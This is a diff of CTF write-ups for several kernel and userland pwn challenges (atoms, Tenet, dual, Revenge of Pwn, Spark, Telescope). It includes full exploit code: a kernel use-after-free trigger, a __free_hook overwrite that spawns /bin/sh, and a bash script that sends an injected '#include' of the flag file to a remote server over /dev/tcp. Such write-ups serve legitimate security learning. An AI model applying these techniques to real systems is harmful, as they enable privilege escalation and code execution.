-struct __attribute__((aligned(8))) s_pool
-{
-  _QWORD token;
-  __int32 ref_counter;
-  _DWORD lock;
-  msg msgs[16];
-};
-
-```
-`token` is the identifier of the pool, `lock` is the resource used for locking mechanism. `msgs` are the pages/messages stored in the pool.
-
-`ref_counter` is counting how many *things* have a reference to this pool.
-The `ref_counter` is set to one when the pool is selected with the token.
-When `ref_counter` reaches zero, all `pool` contents are set free (`atoms_mem_put`).
-Ideally should reach zero only when the `fd` is closed.
-mapping a page increase the counter by 1, unmapping a page decrease the counter by 1
-
-### The (Unintented) Vulnerability.
-The challenge's obvious goal was to get some of the locks interleaved to end up in a deadlock. We did not find such a combination. There is an exploit with the intended solution posted by the author david942j. At the time of writing, I (jinblack) do not understand that exploit. We exploited a User After Free that we stumbled on while experimenting.
-
-If you map a message with multiple pages, the `ref_counter` is increased by 1. If you unmap pages singularly, each `munmap` decrease the counter by 1. This allows us to get the counter to zero even if the `fd` is not closed yet.
-
-When the `ref_counter` reaches 0, the structure containing information of the selected token is set free. But because the `fd` is still alive, we can keep doing operations with that pool.
-
-With this vulnerability, our focus changed from getting a **deadlock** to crash the kernel to just **crash** the kernel.
-
-
-### The Exploit
-We modified the `demo.c` program to:
-- **allocate** multiple pages.
-- **deallocate** pages singularly until `ref_counter` reaches 0,
-- **spawn** several children that use the module.
-- **monitor** if the values in the current chunk change with `ATOMS_INFO`.
-- when the value changes, we just try to **use** the module, expecting a crash.
-
-The exploit is not 100% reliable. It happens (quite often) that the program terminates without a crash. We just run the program several times.
-
-```c=
-#include <assert.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <stdint.h>
-
-#define ATOMS_USE_TOKEN    0x4008D900
-#define ATOMS_ALLOC        0xC010D902
-#define ATOMS_RELEASE         0xD903
-#define ATOMS_INFO         0x8018D901
-
-struct atoms_ioctl_alloc {
-  uint64_t size;
-  uint64_t unk;
-};
-
-struct atoms_ioctl_info {
-  uint64_t token;
-  uint64_t num;
-  uint64_t index;
-};
-
-#define DEV_PATH "/dev/atoms"
-#define TOKEN 0xdeadbeef
-
-static void print_info(int fd){
-  struct atoms_ioctl_info arg= {
-    .token = 0x0,
-    .num = 0x0,
-    .index = 0x0,
-  };
-  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
-  printf("token: %lx\t num %lx\t index %lx\n", arg.token, arg.num, arg.index);
-
-}
-
-static int get_token(int fd){
-  struct atoms_ioctl_info arg= {
-    .token = 0x0,
-    .num = 0x0,
-    .index = 0x0,
-  };
-  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
-  return arg.token;
-}
-
-static void hex_printer(uint8_t *c, int size){
-  for(int i=0; i < size; i++){
-    printf("%02x ", c[i]);
-  }
-  puts("");
-}
-
-static int open_atoms(){
-  int fd = open(DEV_PATH, O_RDWR);
-  assert(fd >= 0);
-  return fd;
-}
-
-static void set_token(int fd, uint64_t token){
-  assert(ioctl(fd, ATOMS_USE_TOKEN, token) == 0);
-}
-
-static void set_token_noa(int fd, uint64_t token){
-  printf("s_token %x\n", ioctl(fd, ATOMS_USE_TOKEN, token));
-}
-
-
-static void alloca_size(int fd, uint32_t size){
-  struct atoms_ioctl_alloc arg = {
-    .size = size,
-  };
-  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
-}
-
-static void *mappa(int fd, uint64_t size){
-  void *ptr = mmap(0, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
-  printf("mem: %p\n", ptr);
-  assert(ptr != MAP_FAILED);
-  return ptr;
-}
-
-static void release(int fd){
-    assert(ioctl(fd, ATOMS_RELEASE) == 0);
-}
-
-static void fill_a_token(uint64_t token, int size){
-  int fd = open_atoms();
-  set_token(fd, token);
-
-  for (int i=0; i < 16; i++)
-    alloca_size(fd, size);
-}
-
-
-static void child_work() {
-  printf("[child] start\n");
-  int fd = open_atoms();
-  set_token(fd, 0x41424344);
-  char *ptr = mappa(fd, 0x1000);
-  printf("mem: %p\n", ptr);
-
-  release(fd);
-  munmap(ptr, 0x1000);
-  close(fd);
-}
-
-static void parent_work(int argc, char *argv[]) {
-  int fd = open_atoms();
-  puts("before set token");
-  set_token(fd, TOKEN);
-
-  // allocate a multiple pages chunk
-  alloca_size(fd, 0x5000);
-  uint8_t *ptr = mappa(fd, 0x5000);
-  hex_printer(ptr, 0x10);
-  strcpy((char*)ptr, "AAAAAAAAAAAAAAAAAAAAB");
-
-  // deallocate page singularly to get ref count below 1
-  printf("before munmap 1 \n");
-  munmap(ptr + 0x1000, 0x1000);
-
-  printf("before munmap 2 \n");
-  munmap(ptr + 0x2000, 0x1000);
-
-  puts("before release!");
-  release(fd); //Here you could use another munmap. It should work as well.
-
-  //At this point the priv_data of the file descriptor is pointing to a free chunk
-
-  int i = 1;
-  while (1)
-  {
-    int pid = fork();
-    //Spawn several child to get the free chunk allocated
-    if(pid == 0){
-      char * newarg[] = { argv[0], "child", NULL };
-      execv(argv[0], newarg);
-      puts("neve executed!");
-    }
-
-    //checks that the chunk is been written with something else
-    if (get_token(fd) != TOKEN){
-      puts("daje!");
-
-      //Try to run stuff to get a crash!
-      print_info(fd);
-      alloca_size(fd, 0x1000);
-      mappa(fd, 0x1000);
-    }
-  }
-
-  puts("before close");
-  close(fd);
-
-  puts("[parent] Message left.");
-}
-
-int main(int argc, char *argv[]) {
-  if (argc == 1) {
-    parent_work(argc, argv);
-  } else {
-    child_work();
-  }
-  return 0;
-}
-
-```
-
-### The Setup
-I believe a nice setup is one of the most important and useful things to solve a CTF challenge.
-I was a little rusty (a better word for noob) with qemu machines. I am putting the setup scripts in this section so that the future me, which will still be rusty with qemu machines, can quickly readapt those scripts during another CTF. Credits for compilation setup go to mebeim.
-
-#### Run machine recompiling my sourcecode.
-```bash=
-#!/bin/bash
-
-# Uncompress, make changes, recompress
-# mkdir initramfs
-# cd initramfs
-# zcat ../initramfs.cpio.gz | cpio -i -d
-# ... edit stuff
-# find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz
-
-set -e
-
-gcc  -static -g \
-  -o initramfs/home/atoms/expl expl.c
-cp expl.c initramfs/home/atoms/expl.c
-cd initramfs
-find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz
-cd ..
-
-qemu-system-x86_64 \
-  -s \
-  -kernel ./bzImage \
-  -initrd ./initramfs_edited.cpio.gz \
-  -nographic \
-  -cpu qemu64 \
-  -append "console=ttyS0 nokaslr panic=-1 softlockup_panic=1" \
-  -no-reboot \
-  -m 256M -smp cores=2 \
-  -device e1000,netdev=network0 \
-  -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
-  -monitor none
-```
-`-s` is for enableing gdbserver on the kernel
-```
--device e1000,netdev=network0 \
--netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
-```
-to enable network communication between gest and host. You also need the network setup script and assign an IP in the machine. I achieved the IP assignment by modifying the init script of the initramfs.
-`nokaslr` as kernel option to disable kaslr.
-`cat /proc/kallsyms` from inside the vm to get position of functions inside the kernel.
-
-#### Setup network for debugging
-I needed the network setup from the host and the guest in order to run a gdbserver on the executable inside the vm.
-```bash=
-#!/bin/sh
-
-sudo ip link add br0 type bridge
-sudo ip addr flush dev br0
-# Assign IP to the bridge.
-sudo ip addr add 192.168.100.50/24 brd 192.168.100.255 dev br0
-
-#reate TAP interface.
-sudo ip tuntap add mode tap user $(whoami)
-ip tuntap show
-
-#Add TAP interface to the bridge.
-sudo ip link set tap0 master br0
-
-#Make sure everything is up
-sudo ip link set dev br0 up
-sudo ip link set dev tap0 up
-
-# DELETE
-# sudo ip link set dev br0 down
-# sudo ip link set dev tap0 down
-# sudo ip link del br0
-# sudo ip link del tap0
-```
-Inside `./initramfs/init`:
-```bash
-ifconfig eth0 up
-ip addr add 192.168.100.51/24 broadcast 192.168.100.255 dev eth0
-```
-
-Tenet
---------
-category: misc/rev
-points: 222pts
-solved: 47
-
->You have to start looking at the world in a new way.
->
->nc 52.192.42.215 9427
->
->Author: david942j
-
-### The Goal of the Challenge
-
-The challenge is based on the `server.rb` ruby script which takes a shellcode as input and wraps it into an ELF executable file that is then run by the `time_machine` debugger.
-The goal of the challenge was to initially reverse this debugger and learn what it exactly does.
-Later on we found out that in order to retrieve the flag the shellcode needed to be executable in two ways: the normal and the reversed one. The peculiarity was that the code would run reversed following the same flow it got in the 'straight' way.
-
-### The generated ELF
-
-First of all we wanted to test out what kind of wrapping was in place within our shellcode, we found out that seccomp was enabled preventing us from executing every possible syscall but read, write, exit, and sigreturn, as mentioned in the man:
-
-
-> The only system calls that the calling thread is permitted to make are read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2)
-
-We also found that it initialized a both readable and writable mapping at address `0x2170000` to `0x2171000`.
-Our shellcode started from address `0xdead0080` and needed to be less than 2KB.
-
-
-### The time_machine debugger
-
-We started reversing this binary, we soon realized that it was a debugger executing whatever it's passed through as a first argument (Our generated ELF).
-Our shellcode was executed step by step saving in a list every executed instruction address.
-Once it got to a SYSCALL instruction it checked whether the EAX register was set to 0x3C (sys_exit) and, if so, it started executing every instruction stored in the list in reversed order.
-The syscall (or sysenter) instructions were completely ignored and even if we got one we couldn't execute almost anything because of the seccomp.
-The debugger, once started, also sets an 8byte cookie to ```0x2170000```, checks if it's cleared once our shellcode is executed and rechecks if it's there once it got executed the other way back.
-
-### The shellcode
-
-So the challenge was: write down an assembly that could erase the cookie when executed in the normal way and could restore it when executed with the same flow but reversed.
-Our first tought was to store it into a register and xor it to memory in a way that looked like this:
-```
-mov rcx, 0x2170000
-mov rdx, 0x0     ; Clean rdx
-xor rdx, [rcx]   ; Set/erase rdx
-xor [rcx], rdx   ; Erase/set memory
-mov rcx, 0x2170000
-mov eax, 0x3c
-syscall
-```
-Of course, it wasn't that simple, the registers (both the CPU and FP ones) got erased right before the reversed execution, we needed somewhere else to store the cookie.
-The stack? No, we couldn't have a stack address in the reversed execution.
-The rest of the ```0x2170000``` mapping? No, this debugger checked also that the entire page was NULL(ed).
-But then we realized that we actually had a memory: the executed instruction order!
-So the final shellcode looked like this:
-
-
-```
-mov rdx, 0x2170000 ; initialize rdx to cookie address
-mov rsp, 0x2170500 ; improvised stack to store ret values
-
-mov rcx, rdx
-add rcx, 0
-call confrontoLow ; confronto == compare
-add rcx, 0
-mov rcx, rdx
-add rcx, 0
-call confrontoHigh
-add rcx, 0
-
-mov rcx, rdx
-
-add rcx, 1
-call confrontoLow
-add rcx, 1
-mov rcx, rdx
-add rcx, 1
-call confrontoHigh
-add rcx, 1
-
-mov rcx, rdx
-    .
-    . ; Replicated code for every nibble possible value
-    .
-add rcx, 15 ; While coding at 4am, we didn't realized that up to 7 was enough, we copied more than needed(16 bytes)
-call confrontoLow
-add rcx, 15
-mov rcx, rdx
-add rcx, 15
-call confrontoHigh
-add rcx, 15
-
-
-push 0 ; clean improvised stack
-; reset a bunch of things just to be sure
-mov rsp, 0x2170500
-mov rdx, 0x2170000
-mov rcx, 0x2170500
-xor rdx,rdx
-xor rbx,rbx
-xor rcx,rcx
-xor r14,r14
-; Or should I comment here? Whatever...
-mov rax, 0x3c
-syscall
-
-
-; Check the upper nibble and jump to the calculated function offset
-confrontoHigh:
-xor rbx,rbx
-mov bl, byte ptr[rcx]
-shr bl, 4
-mov r14, 0xdead035b ; absolute for nibble00High
-add r14, rbx        ; multiply by 8 for lazy people
-add r14, rbx
-add r14, rbx
-add r14, rbx
-add r14, rbx
-add r14, rbx
-add r14, rbx
-add r14, rbx
-jmp r14
-
-
-; Check the lower nibble and jump to the calculated function offset
-confrontoLow:
-xor rbx,rbx
-mov bl, byte ptr[rcx]
-and bl, 0xf
-mov r14, 0xdead030b ; absolute for nibble00Low
-add r14, rbx        ; multiply by 5 for lazy people
-add r14, rbx
-add r14, rbx
-add r14, rbx
-add r14, rbx
-jmp r14
-
-
-nibble00Low:
-xor qword ptr [rcx],0x00
-ret
-
-nibble01:
-xor qword ptr [rcx],0x01
-ret
-    .
-    .
-    .
-nibble0f:
-xor qword ptr [rcx],0x0f
-ret
-
-
-nibble00High:
-xor qword ptr [rcx],0x00
-ret
-nop  ; Needed a 3 byte offset because xor with immediate ≤0x7f is smaller than the other half byte (Wtf x64 assembly?)
-nop
-nop
-
-nibble10:
-xor qword ptr [rcx],0x10
-ret
-nop
-nop
-nop
-    .
-    .
-    .
-nibble70:
-xor qword ptr [rcx],0x70
-ret
-nop
-nop
-nop
-
-nibble80:
-xor qword ptr [rcx],0x80
-ret
-    .
-    .
-    .
-nibblef0:
-xor qword ptr [rcx],0xf0
-ret
-```
-
-And the flow does the rest... When it goes back it initializes a register at the right byte address and the flow 'remembers' which value every nibble had by executing the code segment containing the xor with that value.
-
-### Conclusion
-
-We could, as we had seen from the solution, have used bits instead of nibbles but hey! At least we didn't use bytes!
-Also, during our journey, we thought we could use some floating-point register but we had seen that this wasn't the case because those got erased too. (Turns out we were wrong because the xmm registers did got erased, while the ymm registers didn't get erased)
-
-
-dual
---------
-Heap exploitation in Rust? Is there any hope? Yes if you implement your own Garbage Collector.
-
-
-## The program
+### The program
 
 The binary doesn't have any hard mitigations:
+
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	ymbols		FORTIFY	Fortified	Fortifiable	FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   3950) Symbols	  No	0		12		dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
 ```
 
-# The vulnerability
+### The vulnerability
+
 The struct of the Nodes of the Graph is:
-```rust=
+
+```rust
 struct Node{
     id: u64,              // 0x0 id of the node
     this_index: u64,      // 0x8 index of the current obj inside of the pool
@@ -1705,9 +658,10 @@ struct Node{
 }
 ```
 
-After ~~fuzzing~~ playing with the binary we found out that using `write_bin` with length 0 causes a bug.
+After ~~fuzzing~~ playing with the binary we found out that using `write_bin`
+with length 0 causes a bug.
 
-```rust=
+```rust
 fn write_bin(){
     println!("node_id>");
     let node_id = read_int();
@@ -1736,11 +690,14 @@ fn encode(bin_vals, bin_len) -> (&str, u64){
     }
     ...
 }
-
 ```
-(Here we skip over a lot of details which are not relevant here.)
-Basically the `write_bin` function always add to the pool even if the encoding fails.
-The garbage collector considers a cell free if its `value >> 3 == 0` and this olds for NULL. Therefore we have a type confusion where we can have the same memory referenced as a text and a node.
+
+(Here we skip over a lot of details which are not relevant here.) Basically the
+`write_bin` function always add to the pool even if the encoding fails.
+
+The garbage collector considers a cell free if its `value >> 3 == 0` and this
+olds for NULL. Therefore we have a type confusion where we can have the same
+memory referenced as a text and a node.
 
 ![](https://i.imgur.com/2GSOiz3.png)
 
@@ -1770,10 +727,12 @@ def forge_node(**kwargs):
     return node_id
 ```
 
-Now that we can forge arbitrary nodes we need to find a leak of the libc address and a write primitive.
+Now that we can forge arbitrary nodes we need to find a leak of the libc address
+and a write primitive.
 
 The pseudo-rust of the connect_node function is:
-```rust=
+
+```rust
 fn connect_node() {
     println!("pred_id>");
     let pred_id = read_int();
@@ -1816,10 +775,18 @@ fn connect_node() {
     }
 }
 ```
-So if we can craft two arbitrary nodes, we can use `connect_node` to get arbitrary write.
 
-For the libc leak we can do the usual unsorted bin leak (free a chunk into the unsorted bin, then read the pointer to the arena that will be placed in the heap).
-Here we create a node with arbitrary big `text_len` to be able to read out of bound, then allocate and free a chunk to read the heap-metadata of the freed chunk.
+So if we can craft two arbitrary nodes, we can use `connect_node` to get
+arbitrary write.
+
+For the libc leak we can do the usual unsorted bin leak (free a chunk into the
+unsorted bin, then read the pointer to the arena that will be placed in the
+heap).
+
+Here we create a node with arbitrary big `text_len` to be able to read out of
+bound, then allocate and free a chunk to read the heap-metadata of the freed
+chunk.
+
 ```python
 nb = create(0)
 # Bug: write_bin with size 0 will return 1 instead of a pointer.
@@ -1842,19 +809,25 @@ write_text(nb, crafted)
 leak = read(n1)
 ```
 
-# The exploit
-In the following code we will omit the primitives for simplicity sake, the complete script can be found [here](https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab).
+### The exploit
 
-Now that we can leak a libc address and we have a write-what-where primitive we can open a shell by either modifying the `.got.plt` or by overwriting one of the hooks in the libc.
-We chose to overwrite the `__free_hook` since it's faster.
+In the following code we will omit the primitives for simplicity sake, the
+complete script can be found
+[here](https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab).
+
+Now that we can leak a libc address and we have a write-what-where primitive we
+can open a shell by either modifying the `.got.plt` or by overwriting one of the
+hooks in the libc. We chose to overwrite the `__free_hook` since it's faster.
 
 Steps to get a shell:
+
  - get the leak
  - craft the nodes for the arbitrary write
  - write the address of `system` in `__free_hook`
  - create a text with `/bin/sh\x00` and then free it
 
 The full exploit:
+
 ```python
 
 from pwn import *
@@ -1927,122 +900,21 @@ write_text(nb, 'A'*1500, shell=True)
 p.interactive()
 ```
 
-Revenge of Pwn
---------------
 
-**Misc, Pwn - 255 pts**
+Spark
+-----
 
-Our task is to write an exploit to "pwn" a
-[`pwntools`](https://github.com/Gallopsled/pwntools) Python script that runs on
-the remtoe server. When we connect, we can upload an executable: this executable
-is then saved and exposed in the local on port 1337. Then, the Python script is
-started. Our executable does not have the right to read the flag, which is at
-`/home/deploy/flag`, but the Python script does. We need to find a way to make
-it read and spit out that file.
-
-The Python script does the following:
-
-1. Start listening on port 31337.
-2. Expect to receive a string containing a stack address
-   (`stack address @ 0xXXX`) from the program right away.
-3. Prepare and send a shellcode to our program. The shellcode is meant to leak
-   an `fd` number from the stack and send it back as a decimal string to the
-   Python script by conencting back to port 31337. The code sends the `fd`
-   number followed by a `@` character.
-4. Receive the leaked `fd` on port 31337, using `s.recvuntil('@')`.
-5. Use the value to craft some more shellcode which is then sent to our program.
-
-When receiving the `fd` number, the Python script treats it as a string without
-converting it to integer. When passing the string to the `shellcraft` function
-of `pwntools`, this value is directly inserted into an assembly program that is
-then passed to `cpp` (compiler) to evaluate preprocessor macros and then to `as`
-(assembler) to assemble it into the actual shellcode.
-
-Since we have control on the "vulnerable" program that the script tries to
-connect to, after sending a fake stack address, we can just connect back to the
-script on port 31337 and send an arbitrary string followed by `@`. This string
-will then be passed to `shellcraft`, and it ends up in the middle of the
-assembly program that is being compiled into shellcode.
-
-The remote server says `ELF size? (MAX: 6144)` when connecting, which makes it
-seems like it only accepts an ELF file. Sure, we could craft a very simple ELF
-that does a write plus connect, no big deal. However, we can send any kind of
-file and the serer will mark it as executable. We can therefore just send a Bash
-script as executable and make our life 10 times easier.
-
-Now in our executable we could just send `.incbin "/home/deploy/flag"` and have
-`as` include the flag as raw bytes in the resulting shellcode that is then sent
-back to us, but `pwntools`
-[makes some very strict sanity checks](https://github.com/Gallopsled/pwntools/blob/stable/pwnlib/util/safeeval.py#L46)
-on our string before actually inserting it into the assembly. Our string can
-only be a valid Python expression: it is compiled using
-[`compile()`](https://docs.python.org/3/library/functions.html#compile) and the
-resulting bytecode is checked against a whitelist of Python opcodes before being
-evaluated and inserted in the assembly. Long story short, we nee to pass this
-check and cannot just send arbitrary stuff.
-
-Since the assembly will be parsed by `cpp`, it can contain valid C preprocessor
-directives, like for example `#include`. Luckily, `#` in Python delimits the
-start of a comment, which is completely ignored by `compile()`. We can therefore
-send a number followed by a newline and then `#include </home/deploy/flag>@`.
-
-Here's the complete exploit:
-
-```bash
-#!/bin/bash
-# @mebeim - 2020-11-29
-
-{
-cat <<EOF
-122
-#!/bin/bash
-
-echo 'stack address @ 0x1234'
-sleep 1
-echo -e '123\n#include "/home/deploy/flag"@' > /dev/tcp/127.0.0.1/31337
-EOF
-} > /dev/tcp/3.115.58.219/9427
-```
-
-This will result in the remote `pwntools` trying to compile something like this:
-
-```
-    push 123
-#include </home/deploy/flag>
-    push 16384
-```
-
-Which will make `cpp` include the flag in the file. Afterwards, when passing the
-file to `as`, it will die because the source is invalid, and make `pwntools`
-dump the script and the flag to `stderr`:
-
-```
-[ERROR] An error occurred while assembling:
-       1: .section .shellcode,"awx"
-       2: .global _start
-       3: .global __start
-       4: _start:
-       5: __start:
-       6: .intel_syntax noprefix
-       7: stager_3:
-       8:     push 123
-       9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
-      10:     push 16384
-...
-...
-/var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}'
-```
-
-
-sparks
---------
+> Shortest Path AlgoRithm in Kernel!
+>
+> `nc 3.113.76.29 9427`
 
 This challenge is a Linux VM with a custom kernel module, which exposes a new
 `/dev/node` device.
 The module allows building weighted graphs and calculating the shortest distance
 between two nodes.
 
-When we `open` the driver, the descriptor is backed by the following `private_data`:
+When we `open` the driver, the descriptor is backed by the following
+`private_data`:
 
 ```c
 struct node {
@@ -2061,13 +933,13 @@ struct node {
 After opening a node, we can interact via ioctl.
 There are four ioctls:
 
-- Link (0x4008d900): takes two node descriptors A and B, and a edge weight, and
-  creates the edges A->B and B->A;
-- Info (0x8018d901): provides information about the node;
-- Finalize (0xd902): finalizes the graph rooted in the node, preparing it for
+- Link (`0x4008d900`): takes two node descriptors A and B, and a edge weight,
+  and creates the edges A->B and B->A;
+- Info (`0x8018d901`): provides information about the node;
+- Finalize (`0xd902`): finalizes the graph rooted in the node, preparing it for
   queries;
-- Query (0xc010d903): takes two node descriptors and calculates the total weight
-  of the shortest path between them.
+- Query (`0xc010d903`): takes two node descriptors and calculates the total
+  weight of the shortest path between them.
 
 When we create an edge (nodes can be linked only if not finalized), the
 following structure is allocated:
@@ -2100,27 +972,25 @@ struct node_list {
 ```
 
 The query ioctl, which requires a finalized source node, allocates an array of
-distances of length equal to the source's `traversal` list length.
-Then, it uses this working array to compute shortest-path distances until it
-gets to the shortest-path distance of the destination node, at which point it
-can return the answer.
+distances of length equal to the source's `traversal` list length. Then, it uses
+this working array to compute shortest-path distances until it gets to the
+shortest-path distance of the destination node, at which point it can return the
+answer.
 
 There are a couple bugs.
 
 Finalizing a node will (correctly) increment the refcount of all nodes in the
-DFS traversal.
-However, linking two nodes will not increment their refcount.
+DFS traversal. However, linking two nodes will not increment their refcount.
 Therefore, if two nodes are linked and then one is `close`d, the surviving one
-will have an `edge` whose `node` field points to the other node's freed
-`struct node`, i.e., a dangling pointer (which we could turn into UAF).
+will have an `edge` whose `node` field points to the other node's freed `struct
+node`, i.e., a dangling pointer (which we could turn into UAF).
 
 Moreover, the `traversal_idx` is a property of the node, rather than of the
-traversal.
-This is only correct if a node can be in at most a single traversal, which is
-ensured by the finalization logic, which will mark every node in the DFS as
-finalized and stop when it encounters an already-finalized node.
-However, the query logic also uses a node's children, not just the pre-calculated
-DFS traversal, when updating distances iteratively:
+traversal. This is only correct if a node can be in at most a single traversal,
+which is ensured by the finalization logic, which will mark every node in the
+DFS as finalized and stop when it encounters an already-finalized node. However,
+the query logic also uses a node's children, not just the pre-calculated DFS
+traversal, when updating distances iteratively:
 
 ```
 for every edge E in the current node's edges:
@@ -2131,44 +1001,40 @@ for every edge E in the current node's edges:
 ```
 
 It's possible to create a situation where a node has children in different
-traversals.
-For example, if A has children B and C, then by finalizing C and then A we'd get
-two traversals `[C]` and `[A, B]`, so B and C are in different traversals.
-However, that query code assumes that children are always in the same traversal,
-because the `traversal_idx` is not checked in any way.
-By exploiting this, we can get a OOB write from the distance array.
+traversals. For example, if A has children B and C, then by finalizing C and
+then A we'd get two traversals `[C]` and `[A, B]`, so B and C are in different
+traversals. However, that query code assumes that children are always in the
+same traversal, because the `traversal_idx` is not checked in any way. By
+exploiting this, we can get a OOB write from the distance array.
 
 Our exploit is needlessly complex, but we blame sleep deprivation :)
 
-We use the first bug (edge with dangling ptr) to cause a
-crash during a query.
-We reclaim the freed node using the [setxattr+userfaultfd technique](https://duasynt.com/blog/linux-kernel-heap-spray)
+We use the first bug (edge with dangling ptr) to cause a crash during a query.
+We reclaim the freed node using the
+[setxattr+userfaultfd technique](https://duasynt.com/blog/linux-kernel-heap-spray)
 and we fake a node with a huge `traversal_idx` (resulting in a non-canonical
-access) to crash the query.
-This will not crash the kernel, but will print a panic to dmesg, which we can
-read, and leak a couple pointers: a node pointer, and the location of the
-distance array of the crashing query.
-Note that the array is freed after the query, but since the query crashed, it's
-still allocated.
+access) to crash the query. This will not crash the kernel, but will print a
+panic to dmesg, which we can read, and leak a couple pointers: a node pointer,
+and the location of the distance array of the crashing query. Note that the
+array is freed after the query, but since the query crashed, it's still
+allocated.
 
 Then, we shape the heap so that a query will allocate the distance array right
-before a node.
-We use the OOB in query to modify the node's refcount.
-Then, we are able to free the node while still retaining a file descriptor to it.
-By reclaiming the freed node, we now have a primitive that gives us full control
-of a node structure that's backing a live file descriptor.
-This is properly engineered to that we can repeatedly free and reclaim the node
-as many times as we want, so that we can change the structure contents at will.
+before a node. We use the OOB in query to modify the node's refcount. Then, we
+are able to free the node while still retaining a file descriptor to it. By
+reclaiming the freed node, we now have a primitive that gives us full control of
+a node structure that's backing a live file descriptor. This is properly
+engineered to that we can repeatedly free and reclaim the node as many times as
+we want, so that we can change the structure contents at will.
 
 We exploit the controlled node primitive to build an arbitrary read primitive.
 The info ioctl, along other values, also outputs us the `size` of the node's
-`traversal`.
-Since we control the `traversal` field, this allows us to read a 8-byte integer
-from an arbitrary address (repeatedly).
-We use the read, coupled with the pointers we leaked earlier, to scan the heap
-and find our fake node (we put a unique marker as id).
-Then, since during the info ioctl the `state_lock` lock is held, we can read
-`current` from the mutex, and our task's `cred` pointer from that.
+`traversal`. Since we control the `traversal` field, this allows us to read a
+8-byte integer from an arbitrary address (repeatedly). We use the read, coupled
+with the pointers we leaked earlier, to scan the heap and find our fake node (we
+put a unique marker as id). Then, since during the info ioctl the `state_lock`
+lock is held, we can read `current` from the mutex, and our task's `cred`
+pointer from that.
 
 We then abuse cleanup logic on a fake node to free the leaked distance array
 that was still allocated, so that the next (properly sized) query will reclaim
@@ -2667,24 +1533,407 @@ int main(void)
 
 [https://youtu.be/3-4cnyswp4w](https://youtu.be/3-4cnyswp4w)
 
+
+Telescope
+---------
+
+> Look up in the sky ⇑
+>
+> nc 13.112.193.37 8573
+>
+> Note:
+> The service is running on Ubuntu 20.04
+
+### Challenge Releas Content
+
+|              file | comment                                             |
+| -----------------:| --------------------------------------------------- |
+|   telescope.proto | This is the description of the protocol of protobuf |
+|         telescope | the binary to exploit                               |
+| libprotobuf.so.17 | protobuf remote library                             |
+|         libc.so.6 | libc remote library                                 |
+
+### The Binary
+
+The binary is simple to understand is the classic few option CTF binary.
+It is possible to create read and modify heap chunks with an extra interesting option that is to interpret the bytes ad protobuf protocol.
+Chunks are saved on an array of 1024 elements in `.bss` called `slots`, and the corresponding size is saved on another array in `.bss` called `slot_sizes`.
+In particulare, there are 6 options:
+
+#### [1] Create chunk
+
+It asks you for the number of slots and the size. It makes a malloc of the given
+size, memset the chunk to zero, and store a pointer to the new chunk into
+`slots[<index>]` where `<index>` is also a parameter chosen by the user. It also
+set `slots_sizes[<index>]` to the corrisponding size.
+
+#### [2] Read data into a chunk
+
+It asks for a slots index and then lets you write inside the chunk. The amount
+of bytes that you can write is the number of the size saved into `slots_sizes`.
+Bytes are read singularly. There is no possibility of short-read (read fewer
+bytes than the size).
+
+#### [3] Free chunk
+
+It asks for a slot index. It calls `free` on the pointer stored at
+`slots[<index>]` . It stores 0 into `slots[<index>]` and `slots_size[<index>]`
+
+#### [4] Protobuf unserialize and reserialize
+
+This is the most complicated option, and the only one that took a few hours to
+be completely understood. It asks for a slot index. It parses the content with
+the protobuf parser generating the `Telescope` object. It checks that the field
+`pass` of the `Telescope` object is equal to `0xDEADBEEF`. If the `pass` field
+is not correctly set, you get an abort.
+
+If you manage to pass this check, the program removes the field `pass`.
+It prints out the number of `lens` (the other field of `Telescope`).
+It serializes the new object to a string. It uses a `memcpy` to copy the new string (byte representation of the object) into the slot.
+
+#### [5] Prints the chunk
+
+It asks for an index. It prints out `slots_sizes[<index>]` bytes of
+`slots[<index>]`.
+
+#### [-] Exit
+
+Any other option exit the program.
+
+### ProtoBuf
+
+Protobuf is a nice library that lets you define structured data that can be
+serialized and read back. It is nice because it supports many languages and
+automatically generates code to handle these data.
+
+```ocaml
+syntax = "proto2";
+
+message Telescope {
+    repeated int64 lens = 1;
+    optional int64 pass = 2;
+}
+```
+
+There are 2 fields in this object. `pass` is optional and need to be set to
+`0xDEADBEEF` because the code checks its value. `lens` is an array of integers.
+It can be empty or any size.
+
+It is vital to understand how the encoding of protobuf works. You can find
+details of the encoding on
+[protobuf documentation](https://developers.google.com/protocol-buffers/docs/encoding).
+The documentation is written very well and explains how the encoding is working
+way better than I will ever be able to do. If you want to understand the
+vulnerability, you need to read the documentation and understand the
+serialization types.
+
+Here I give you an example of a `Telescope` object is encoded:
+
+```
+\x08\x17\x08\x20\x10\x11
+```
+
+Protobuf encode the field and is type in one byte followed by the value
+`(field_number << 3) | wire_type`. If you want to encode field numeber 1 with
+type 0 you get `1 << 3 | 0 = 0x08`. In particular, the byte `\x08` represent the
+field `lens` while `\x10` is the field `pass`. In this paricular string we have
+2 elements for `lens`: `\x08\x17` and `\x08\x20`. `\x10\x11` is instead the
+encoding of `pass`. Hence, when deserialized we will have
+`obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.
+
+### Testing Protobuf
+
+I spent hours playing with protobuf serialization. It was evident to me (after a
+while playing CTF you develop an intuition on where the author wants you to
+look.) that the vulnerability was in encoding/decoding protobuf. I tried several
+things. I do not recall them all. I had a python and a c++ program that I can
+use as a decoder/encoder debug.
+
+Few intresting discovery that I recall. The order of elements does not matter.
+You can have few lens the a pass and other lens: `\x08\x17\x10\x11\x08\x20` is
